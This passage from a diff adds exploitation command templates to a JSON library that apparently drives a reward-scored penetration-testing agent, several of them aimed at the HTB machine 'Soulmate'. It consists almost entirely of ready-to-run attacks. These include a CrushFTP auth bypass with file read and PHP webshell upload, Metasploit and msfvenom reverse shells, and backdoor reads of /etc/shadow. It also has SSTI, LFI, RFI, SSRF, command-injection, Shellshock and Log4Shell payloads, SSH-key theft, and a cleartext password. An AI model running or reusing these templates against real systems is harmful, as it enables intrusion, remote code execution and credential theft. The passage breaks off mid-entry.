+      "optional_params": {
+        "domain": "soulmate.htb"
+      },
+      "preconditions": [
+        "ports_discovered",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "<username>",
+        "crushadmin",
+        "getUserList",
+        "admin",
+        "ben",
+        "jenna"
+      ],
+      "tags": [
+        "web",
+        "cve_2025_31161",
+        "crushftp",
+        "soulmate",
+        "s3",
+        "htb",
+        "auth_bypass"
+      ],
+      "typical_reward": 25.0
+    },
+    "crushftp_getlog_read": {
+      "template": "_A=$(curl -sk -D- -o/dev/null -H 'Authorization: AWS4-HMAC-SHA256 Credential=anonymous/' -H 'Host: ftp.{domain}' 'http://{target}/' | grep -oP 'CrushAuth=\\K[^;]+' | head -1) && _C=${{_A:0:4}} && curl -sk -H 'Host: ftp.{domain}' -b \"CrushAuth=$_A; currentAuth=$_C\" \"http://{target}/WebInterface/function/?command=getLog&c2f=$_C&path={file_path}\"",
+      "phase": "EXPLOITATION",
+      "description": "CVE-2025-31161 \u2014 Arbitrary file read via CrushFTP getLog API with S3 auth bypass. Read any file the CrushFTP process can access (/etc/passwd, user configs, SSH keys).",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "domain": "soulmate.htb",
+        "file_path": "/etc/passwd"
+      },
+      "preconditions": [
+        "ports_discovered",
+        "vulnerability_found"
+      ],
+      "success_indicators": [
+        "root:",
+        "bin:",
+        "username",
+        "password",
+        "hash",
+        "xml",
+        "user.XML"
+      ],
+      "tags": [
+        "file_read",
+        "cve_2025_31161",
+        "crushftp",
+        "soulmate",
+        "lfi",
+        "htb"
+      ],
+      "typical_reward": 20.0
+    },
+    "crushftp_s3_put_webshell": {
+      "template": "curl -sk -X PUT -H 'Authorization: AWS4-HMAC-SHA256 Credential={upload_user}/' -H 'Host: ftp.{domain}' -d '<?php system($_GET[\"cmd\"]); ?>' 'http://{target}/WEBPROD/{shell_name}'",
+      "phase": "EXPLOITATION",
+      "description": "CVE-2025-31161 \u2014 Upload PHP webshell via CrushFTP S3 PUT API. Exploits S3 auth bypass to write files as any user. User ben's home maps to /WEBPROD/ which serves as nginx web root.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "domain": "soulmate.htb",
+        "upload_user": "ben",
+        "shell_name": "cmd.php"
+      },
+      "preconditions": [
+        "vulnerability_found"
+      ],
+      "success_indicators": [
+        "200",
+        "201",
+        "Created",
+        "OK",
+        "Transfer"
+      ],
+      "tags": [
+        "upload",
+        "crushftp",
+        "s3",
+        "webshell",
+        "rce",
+        "cve_2025_31161",
+        "soulmate",
+        "htb"
+      ],
+      "typical_reward": 40.0
+    },
+    "crushftp_webshell_exec": {
+      "template": "curl -s -H 'Host: {domain}' 'http://{target}/{shell_name}?cmd={command}'",
+      "phase": "EXPLOITATION",
+      "description": "Execute OS command via uploaded PHP webshell on CrushFTP/Soulmate target. Runs as www-data. Note: cleanup script deletes new files within ~2 min, re-upload if needed. Requires Host header because nginx redirects bare IP requests.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "domain": "soulmate.htb",
+        "shell_name": "cmd.php",
+        "command": "id"
+      },
+      "preconditions": [
+        "vulnerability_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "www-data",
+        "root:",
+        "flag",
+        "$"
+      ],
+      "tags": [
+        "rce",
+        "htb",
+        "crushftp",
+        "soulmate",
+        "webshell"
+      ],
+      "typical_reward": 45.0
+    },
+    "crushftp_login_admin": {
+      "template": "curl -sk -X POST -H 'Host: ftp.{domain}' -d 'command=login&username={username}&password={password}' 'http://{target}:{port}/WebInterface/function/'",
+      "phase": "EXPLOITATION",
+      "description": "Login to CrushFTP admin interface with cracked credentials. Port 8080/9090 often available. Returns session token for authenticated API access.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "domain": "soulmate.htb",
+        "username": "crushadmin",
+        "password": "04E2xAXYFfDsEYtu",
+        "port": "8080"
+      },
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "success",
+        "loginResult",
+        "c2f",
+        "response"
+      ],
+      "tags": [
+        "admin",
+        "crushftp",
+        "soulmate",
+        "htb",
+        "login"
+      ],
+      "typical_reward": 30.0
+    },
+    "crushftp_ssh_as_user": {
+      "template": "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target}",
+      "phase": "EXPLOITATION",
+      "description": "SSH login with CrushFTP-discovered credentials. CrushFTP users often map to OS users.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "username": "crushadmin",
+        "password": "04E2xAXYFfDsEYtu"
+      },
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "$",
+        "#",
+        "Last login",
+        "Welcome"
+      ],
+      "tags": [
+        "crushftp",
+        "ssh",
+        "soulmate",
+        "htb",
+        "shell"
+      ],
+      "typical_reward": 50.0
+    },
+    "cme_exec_command": {
+      "template": "crackmapexec smb {target} -u {username} -p {password} -x '{command}'",
+      "phase": "EXPLOITATION",
+      "description": "Execute command via SMB with admin credentials.",
+      "required_params": [
+        "target",
+        "username",
+        "password",
+        "command"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found",
+        "admin_credentials_known"
+      ],
+      "success_indicators": [
+        "[+]",
+        "Pwn3d!"
+      ],
+      "tags": [
+        "exec",
+        "smb",
+        "cme"
+      ],
+      "typical_reward": 8.0
+    },
+    "msfconsole_exploit": {
+      "template": "msfconsole -q -x 'use {module}; set RHOSTS {target}; set LHOST {lhost}; exploit'",
+      "phase": "EXPLOITATION",
+      "description": "Run Metasploit exploit module.",
+      "required_params": [
+        "module",
+        "target",
+        "lhost"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "vulnerability_found"
+      ],
+      "success_indicators": [
+        "session",
+        "opened",
+        "Meterpreter"
+      ],
+      "tags": [
+        "exploit",
+        "metasploit"
+      ],
+      "typical_reward": 10.0
+    },
+    "msfvenom_payload": {
+      "template": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}",
+      "phase": "EXPLOITATION",
+      "description": "Generate Metasploit payload.",
+      "required_params": [
+        "payload",
+        "lhost",
+        "lport",
+        "format",
+        "output"
+      ],
+      "optional_params": {
+        "format": "elf",
+        "payload": "linux/x86/shell_reverse_tcp"
+      },
+      "preconditions": [],
+      "success_indicators": [
+        "Saved as"
+      ],
+      "tags": [
+        "payload",
+        "metasploit"
+      ],
+      "typical_reward": 3.0
+    },
+    "impacket_atexec": {
+      "template": "impacket-atexec {domain}/{username}:{password}@{target} '{command}'",
+      "phase": "EXPLOITATION",
+      "description": "Execute command via Windows Task Scheduler.",
+      "required_params": [
+        "target",
+        "username",
+        "password",
+        "command"
+      ],
+      "optional_params": {
+        "domain": "."
+      },
+      "preconditions": [
+        "smb_service_found",
+        "admin_credentials_known"
+      ],
+      "success_indicators": [
+        "output"
+      ],
+      "tags": [
+        "exec",
+        "scheduled_task",
+        "impacket"
+      ],
+      "typical_reward": 7.0
+    },
+    "impacket_dcomexec": {
+      "template": "impacket-dcomexec {domain}/{username}:{password}@{target} '{command}'",
+      "phase": "EXPLOITATION",
+      "description": "Execute command via DCOM. Stealthier alternative.",
+      "required_params": [
+        "target",
+        "username",
+        "password",
+        "command"
+      ],
+      "optional_params": {
+        "domain": "."
+      },
+      "preconditions": [
+        "smb_service_found",
+        "admin_credentials_known"
+      ],
+      "success_indicators": [
+        "output"
+      ],
+      "tags": [
+        "exec",
+        "impacket",
+        "dcom"
+      ],
+      "typical_reward": 7.5
+    },
+    "msfconsole_auto": {
+      "template": "msfconsole -q -x 'search {query}; use 0; set RHOSTS {target}; exploit'",
+      "phase": "EXPLOITATION",
+      "description": "Search and exploit with Metasploit in one command.",
+      "required_params": [
+        "target",
+        "query"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "services_enumerated"
+      ],
+      "success_indicators": [
+        "session",
+        "opened",
+        "Meterpreter"
+      ],
+      "tags": [
+        "exploit",
+        "auto",
+        "metasploit"
+      ],
+      "typical_reward": 10.0
+    },
+    "mysql_login": {
+      "template": "mysql -h {target} -u {username} -p{password} -e 'SHOW DATABASES;'",
+      "phase": "EXPLOITATION",
+      "description": "Connect to MySQL and list databases.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known",
+        "mysql_service_found"
+      ],
+      "success_indicators": [
+        "Database",
+        "information_schema"
+      ],
+      "tags": [
+        "mysql",
+        "database"
+      ],
+      "typical_reward": 5.0
+    },
+    "mssql_login": {
+      "template": "impacket-mssqlclient {domain}/{username}:{password}@{target}",
+      "phase": "EXPLOITATION",
+      "description": "Connect to MSSQL server.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {
+        "domain": "."
+      },
+      "preconditions": [
+        "credentials_known",
+        "mssql_service_found"
+      ],
+      "success_indicators": [
+        "SQL>"
+      ],
+      "tags": [
+        "mssql",
+        "impacket",
+        "database"
+      ],
+      "typical_reward": 5.0
+    },
+    "rubeus_asreproast": {
+      "template": ".\\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt",
+      "phase": "EXPLOITATION",
+      "description": "AS-REP Roasting from Windows. Get hashes for cracking.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "domain_joined",
+        "windows_shell_obtained"
+      ],
+      "success_indicators": [
+        "$krb5asrep$",
+        "hashes"
+      ],
+      "tags": [
+        "ad",
+        "rubeus",
+        "kerberos"
+      ],
+      "typical_reward": 5.0
+    },
+    "rubeus_kerberoast": {
+      "template": ".\\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt",
+      "phase": "EXPLOITATION",
+      "description": "Kerberoasting from Windows. Get TGS hashes.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "domain_joined",
+        "windows_shell_obtained"
+      ],
+      "success_indicators": [
+        "$krb5tgs$",
+        "hashes"
+      ],
+      "tags": [
+        "ad",
+        "rubeus",
+        "kerberos"
+      ],
+      "typical_reward": 5.0
+    },
+    "vsftpd_exploit": {
+      "template": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit'",
+      "phase": "EXPLOITATION",
+      "description": "Exploit vsftpd 2.3.4 backdoor for root shell.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "shell session",
+        "uid=0",
+        "root",
+        "Backdoor"
+      ],
+      "tags": [
+        "ftp",
+        "exploit",
+        "ms2",
+        "backdoor"
+      ],
+      "typical_reward": 50.0
+    },
+    "unrealircd_exploit": {
+      "template": "msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {target}; exploit'",
+      "phase": "EXPLOITATION",
+      "description": "Exploit UnrealIRCd 3.2.8.1 backdoor for root shell.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "shell session",
+        "uid=0",
+        "root",
+        "Backdoor"
+      ],
+      "tags": [
+        "ms2",
+        "irc",
+        "backdoor",
+        "exploit"
+      ],
+      "typical_reward": 50.0
+    },
+    "telnet_1524": {
+      "template": "{ echo 'id; cat /etc/shadow; echo ARIASKA_DONE'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "EXPLOITATION",
+      "description": "Connect to ingreslock backdoor on port 1524 for instant root.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "root",
+        "uid=0",
+        "Connected",
+        "root@metasploitable"
+      ],
+      "tags": [
+        "ms2",
+        "exploit",
+        "backdoor",
+        "instant"
+      ],
+      "typical_reward": 60.0
+    },
+    "root_shell_confirm": {
+      "template": "id",
+      "phase": "EXPLOITATION",
+      "description": "Confirm root access by checking uid.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "uid=0",
+        "root"
+      ],
+      "tags": [
+        "verification",
+        "post-exploit"
+      ],
+      "typical_reward": 10.0
+    },
+    "rsh_root": {
+      "template": "{ echo 'id; whoami; uname -a'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "EXPLOITATION",
+      "description": "Connect to ingreslock backdoor via telnet for root command execution.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "uid=0",
+        "root"
+      ],
+      "tags": [
+        "ms2",
+        "exploit",
+        "rservices"
+      ],
+      "typical_reward": 40.0
+    },
+    "rlogin_root": {
+      "template": "{ echo 'id; hostname; cat /etc/hostname'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "EXPLOITATION",
+      "description": "Connect to ingreslock for root access and host identification.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "root@",
+        "uid=0",
+        "Last login"
+      ],
+      "tags": [
+        "ms2",
+        "exploit",
+        "rservices"
+      ],
+      "typical_reward": 20.0
+    },
+    "war_deploy": {
+      "template": "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS {target}; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; exploit'",
+      "phase": "EXPLOITATION",
+      "description": "Deploy WAR reverse shell via Tomcat manager.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "shell session",
+        "Meterpreter",
+        "uid="
+      ],
+      "tags": [
+        "ms2",
+        "exploit",
+        "web"
+      ],
+      "typical_reward": 35.0
+    },
+    "psql_rce": {
+      "template": "psql -h {target} -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id'\"",
+      "phase": "EXPLOITATION",
+      "description": "Execute OS commands via PostgreSQL COPY ... TO PROGRAM.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root",
+        "postgres"
+      ],
+      "tags": [
+        "ms2",
+        "rce",
+        "exploit",
+        "db"
+      ],
+      "typical_reward": 35.0
+    },
+    "ssti_detect_jinja2": {
+      "template": "curl -s '{url}' --data '{param}={{{{7*7}}}}' | grep -o '49'",
+      "phase": "EXPLOITATION",
+      "description": "Detect Jinja2 SSTI by injecting {{7*7}} and checking for 49.",
+      "required_params": [
+        "url",
+        "param"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "49"
+      ],
+      "tags": [
+        "ssti",
+        "detection",
+        "web",
+        "jinja2"
+      ],
+      "typical_reward": 8.0
+    },
+    "ssti_exploit_jinja2": {
+      "template": "curl -s '{url}' --data \"{param}={{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}\"",
+      "phase": "EXPLOITATION",
+      "description": "Exploit Jinja2 SSTI for RCE via os.popen.",
+      "required_params": [
+        "url",
+        "param",
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ssti_confirmed",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root:",
+        "www-data"
+      ],
+      "tags": [
+        "ssti",
+        "rce",
+        "web",
+        "jinja2"
+      ],
+      "typical_reward": 15.0
+    },
+    "ssti_detect_twig": {
+      "template": "curl -s '{url}' --data '{param}={{{{7*7}}}}' | grep -o '49'",
+      "phase": "EXPLOITATION",
+      "description": "Detect Twig SSTI (PHP Symfony). Same syntax as Jinja2.",
+      "required_params": [
+        "url",
+        "param"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "49"
+      ],
+      "tags": [
+        "php",
+        "web",
+        "twig",
+        "detection",
+        "ssti"
+      ],
+      "typical_reward": 8.0
+    },
+    "ssti_exploit_twig": {
+      "template": "curl -s '{url}' --data \"{param}={{{{['{cmd}']|filter('system')}}}}\"",
+      "phase": "EXPLOITATION",
+      "description": "Exploit Twig SSTI for RCE via system() filter.",
+      "required_params": [
+        "url",
+        "param",
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ssti_confirmed",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root:",
+        "www-data"
+      ],
+      "tags": [
+        "rce",
+        "php",
+        "web",
+        "twig",
+        "ssti"
+      ],
+      "typical_reward": 15.0
+    },
+    "ssti_detect_erb": {
+      "template": "curl -s '{url}' --data '{param}=<%25%3d7*7%25>' | grep -o '49'",
+      "phase": "EXPLOITATION",
+      "description": "Detect ERB SSTI (Ruby/Rails). Uses <%%= expr %>.",
+      "required_params": [
+        "url",
+        "param"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "49"
+      ],
+      "tags": [
+        "ruby",
+        "web",
+        "detection",
+        "ssti",
+        "erb"
+      ],
+      "typical_reward": 8.0
+    },
+    "tplmap_scan": {
+      "template": "python3 tplmap.py -u '{url}' -d '{param}=SSTI*'",
+      "phase": "EXPLOITATION",
+      "description": "Automated SSTI detection and exploitation with tplmap.",
+      "required_params": [
+        "url",
+        "param"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "Confirmed",
+        "Tplmap",
+        "injection point"
+      ],
+      "tags": [
+        "ssti",
+        "scanner",
+        "web",
+        "automated"
+      ],
+      "typical_reward": 10.0
+    },
+    "lfi_etc_passwd": {
+      "template": "curl -s '{url}?{param}=../../../../../../../../etc/passwd'",
+      "phase": "EXPLOITATION",
+      "description": "Basic LFI to read /etc/passwd. Validates LFI vulnerability.",
+      "required_params": [
+        "url",
+        "param"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "root:",
+        "bin/bash",
+        "nologin",
+        "/home/"
+      ],
+      "tags": [
+        "lfi",
+        "web",
+        "linux"
+      ],
+      "typical_reward": 8.0
+    },
+    "lfi_double_encode": {
+      "template": "curl -s '{url}?{param}=....//....//....//....//etc/passwd'",
+      "phase": "EXPLOITATION",
+      "description": "LFI with double-dot bypass for basic filters.",
+      "required_params": [
+        "url",
+        "param"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "root:",
+        "bin/bash",
+        "nologin"
+      ],
+      "tags": [
+        "lfi",
+        "web",
+        "bypass",
+        "linux"
+      ],
+      "typical_reward": 8.5
+    },
+    "lfi_php_filter": {
+      "template": "curl -s '{url}?{param}=php://filter/convert.base64-encode/resource={file}'",
+      "phase": "EXPLOITATION",
+      "description": "PHP filter wrapper to read source code as base64.",
+      "required_params": [
+        "url",
+        "param",
+        "file"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "lfi_confirmed",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "PD9w",
+        "PCFET0",
+        "base64"
+      ],
+      "tags": [
+        "lfi",
+        "php",
+        "web",
+        "source-code"
+      ],
+      "typical_reward": 10.0
+    },
+    "lfi_log_poison": {
+      "template": "curl -s -A '<?php system($_GET[\"cmd\"]); ?>' '{url}' && curl -s '{url}?{param}=../../../../var/log/apache2/access.log&cmd={cmd}'",
+      "phase": "EXPLOITATION",
+      "description": "LFI + log poisoning for RCE. Injects PHP in User-Agent, then includes access log.",
+      "required_params": [
+        "url",
+        "param",
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "lfi_confirmed",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "www-data",
+        "root:"
+      ],
+      "tags": [
+        "log-poisoning",
+        "lfi",
+        "rce",
+        "web"
+      ],
+      "typical_reward": 15.0
+    },
+    "lfi_ssh_key": {
+      "template": "curl -s '{url}?{param}=../../../../../../../../home/{user}/.ssh/id_rsa'",
+      "phase": "EXPLOITATION",
+      "description": "LFI to steal SSH private keys for user access.",
+      "required_params": [
+        "url",
+        "param",
+        "user"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "lfi_confirmed",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "BEGIN",
+        "PRIVATE KEY",
+        "RSA",
+        "OPENSSH"
+      ],
+      "tags": [
+        "lfi",
+        "web",
+        "credential",
+        "ssh"
+      ],
+      "typical_reward": 20.0
+    },
+    "rfi_php_shell": {
+      "template": "curl -s '{url}?{param}=http://{lhost}/shell.php'",
+      "phase": "EXPLOITATION",
+      "description": "Remote File Inclusion to load a PHP shell from attacker server.",
+      "required_params": [
+        "url",
+        "param",
+        "lhost"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "www-data",
+        "shell"
+      ],
+      "tags": [
+        "php",
+        "web",
+        "rfi",
+        "shell"
+      ],
+      "typical_reward": 15.0
+    },
+    "ssrf_localhost_scan": {
+      "template": "curl -s '{url}' --data '{param}=http://127.0.0.1:{port}/'",
+      "phase": "EXPLOITATION",
+      "description": "SSRF to scan internal localhost services.",
+      "required_params": [
+        "url",
+        "param",
+        "port"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "200",
+        "OK",
+        "html",
+        "json",
+        "Welcome"
+      ],
+      "tags": [
+        "ssrf",
+        "web",
+        "internal"
+      ],
+      "typical_reward": 8.0
+    },
+    "ssrf_cloud_metadata": {
+      "template": "curl -s '{url}' --data '{param}=http://169.254.169.254/latest/meta-data/'",
+      "phase": "EXPLOITATION",
+      "description": "SSRF to access AWS EC2 metadata service. Reveals IAM credentials.",
+      "required_params": [
+        "url",
+        "param"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found",
+        "ssrf_confirmed"
+      ],
+      "success_indicators": [
+        "ami-id",
+        "instance-id",
+        "iam",
+        "security-credentials"
+      ],
+      "tags": [
+        "aws",
+        "ssrf",
+        "web",
+        "cloud"
+      ],
+      "typical_reward": 20.0
+    },
+    "ssrf_internal_admin": {
+      "template": "curl -s '{url}' --data '{param}=http://{internal_host}:{port}/admin'",
+      "phase": "EXPLOITATION",
+      "description": "SSRF to access internal admin panels not exposed externally.",
+      "required_params": [
+        "url",
+        "param",
+        "internal_host",
+        "port"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found",
+        "ssrf_confirmed"
+      ],
+      "success_indicators": [
+        "admin",
+        "dashboard",
+        "panel",
+        "manage"
+      ],
+      "tags": [
+        "ssrf",
+        "web",
+        "admin"
+      ],
+      "typical_reward": 12.0
+    },
+    "cmd_inject_semicolon": {
+      "template": "curl -s '{url}' --data '{param}=test;{cmd}'",
+      "phase": "EXPLOITATION",
+      "description": "OS command injection via semicolon separator.",
+      "required_params": [
+        "url",
+        "param",
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root:",
+        "www-data",
+        "Linux"
+      ],
+      "tags": [
+        "rce",
+        "web",
+        "command-injection"
+      ],
+      "typical_reward": 12.0
+    },
+    "cmd_inject_pipe": {
+      "template": "curl -s '{url}' --data '{param}=test|{cmd}'",
+      "phase": "EXPLOITATION",
+      "description": "OS command injection via pipe operator.",
+      "required_params": [
+        "url",
+        "param",
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root:",
+        "www-data"
+      ],
+      "tags": [
+        "rce",
+        "web",
+        "command-injection"
+      ],
+      "typical_reward": 12.0
+    },
+    "cmd_inject_backtick": {
+      "template": "curl -s '{url}' --data '{param}=test`{cmd}`'",
+      "phase": "EXPLOITATION",
+      "description": "OS command injection via backtick command substitution.",
+      "required_params": [
+        "url",
+        "param",
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root:",
+        "www-data"
+      ],
+      "tags": [
+        "rce",
+        "web",
+        "command-injection"
+      ],
+      "typical_reward": 12.0
+    },
+    "cmd_inject_blind_sleep": {
+      "template": "curl -s -o /dev/null -w '%{{time_total}}' '{url}' --data '{param}=test;sleep+5'",
+      "phase": "EXPLOITATION",
+      "description": "Blind command injection detection via sleep timing.",
+      "required_params": [
+        "url",
+        "param"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "5.",
+        "6.",
+        "7."
+      ],
+      "tags": [
+        "command-injection",
+        "blind",
+        "web"
+      ],
+      "typical_reward": 8.0
+    },
+    "shellshock_cgi": {
+      "template": "curl -s -H 'User-Agent: () {{ :; }}; echo; /bin/bash -c \"{cmd}\"' http://{target}/cgi-bin/{script}",
+      "phase": "EXPLOITATION",
+      "description": "Shellshock (CVE-2014-6271) exploitation via CGI script.",
+      "required_params": [
+        "target",
+        "script",
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found",
+        "cgi_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root:",
+        "www-data",
+        "Linux"
+      ],
+      "tags": [
+        "rce",
+        "cve",
+        "web",
+        "shellshock",
+        "cgi"
+      ],
+      "typical_reward": 15.0
+    },
+    "heartbleed_exploit": {
+      "template": "nmap -p {port} --script ssl-heartbleed {target}",
+      "phase": "EXPLOITATION",
+      "description": "Test for Heartbleed (CVE-2014-0160) OpenSSL memory leak.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "port": "443"
+      },
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "VULNERABLE",
+        "Heartbleed"
+      ],
+      "tags": [
+        "heartbleed",
+        "cve",
+        "ssl",
+        "memory-leak"
+      ],
+      "typical_reward": 10.0
+    },
+    "log4shell_detect": {
+      "template": "curl -s -H 'X-Api-Version: ${{jndi:ldap://{lhost}:1389/a}}' -H 'User-Agent: ${{jndi:ldap://{lhost}:1389/a}}' http://{target}:{port}/",
+      "phase": "EXPLOITATION",
+      "description": "Detect Log4Shell (CVE-2021-44228) via JNDI injection in headers.",
+      "required_params": [
+        "target",
+        "lhost"
+      ],
+      "optional_params": {
+        "port": "8080"
+      },
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "Callback",
+        "LDAP",
+        "DNS"
+      ],
+      "tags": [
+        "cve",
+        "web",
+        "java",
+        "log4shell",
+        "jndi"
+      ],
+      "typical_reward": 12.0
+    },
+    "drupalgeddon2": {
+      "template": "python3 drupalgeddon2.py {url}",
+      "phase": "EXPLOITATION",
+      "description": "Drupalgeddon 2 (CVE-2018-7600) \u2014 Drupal RCE without authentication.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "drupal_found",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "www-data",
+        "shell"
+      ],
+      "tags": [
+        "rce",
+        "cve",
+        "web",
+        "drupal"
+      ],
+      "typical_reward": 15.0
+    },
+    "upload_php_double_ext": {
+      "template": "curl -s -F 'file=@shell.php.jpg;type=image/jpeg' '{url}'",
+      "phase": "EXPLOITATION",
+      "description": "Upload PHP shell with double extension bypass.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "upload_found",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uploaded",
+        "success",
+        "200"
+      ],
+      "tags": [
+        "file-upload",
+        "webshell",
+        "web",
+        "bypass"
+      ],
+      "typical_reward": 10.0
+    },
+    "upload_php_magic_bytes": {
+      "template": "curl -s -F 'file=@shell.php.gif;type=image/gif' '{url}'",
+      "phase": "EXPLOITATION",
+      "description": "Upload PHP shell with GIF magic bytes header (GIF89a).",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "upload_found",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uploaded",
+        "success"
+      ],
+      "tags": [
+        "file-upload",
+        "web",
+        "bypass",
+        "polyglot"
+      ],
+      "typical_reward": 10.0
+    },
+    "upload_htaccess": {
+      "template": "curl -s -F 'file=@.htaccess' '{url}'",
+      "phase": "EXPLOITATION",
+      "description": "Upload .htaccess to make .txt files execute as PHP.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "upload_found",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uploaded",
+        "success"
+      ],
+      "tags": [
+        "apache",
+        "file-upload",
+        "web",
+        "htaccess"
+      ],
+      "typical_reward": 12.0
+    },
+    "upload_aspx_shell": {
+      "template": "curl -s -F 'file=@shell.aspx' '{url}'",
+      "phase": "EXPLOITATION",
+      "description": "Upload ASPX web shell for IIS/Windows targets.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "upload_found",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uploaded",
+        "success"
+      ],
+      "tags": [
+        "windows",
+        "web",
+        "file-upload",
+        "iis",
+        "aspx"
+      ],
+      "typical_reward": 10.0
+    },
+    "webshell_cmd": {
+      "template": "curl -s '{url}?cmd={cmd}'",
+      "phase": "EXPLOITATION",
+      "description": "Execute commands via deployed web shell.",
+      "required_params": [
+        "url",
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "webshell_deployed"
+      ],
+      "success_indicators": [
+        "uid=",
+        "www-data",
+        "root:",
+        "nt authority"
+      ],
+      "tags": [
+        "rce",
+        "webshell",
+        "web"
+      ],
+      "typical_reward": 5.0
+    },
+    "ysoserial_java": {
+      "template": "java -jar ysoserial.jar {gadget} '{cmd}' | base64",
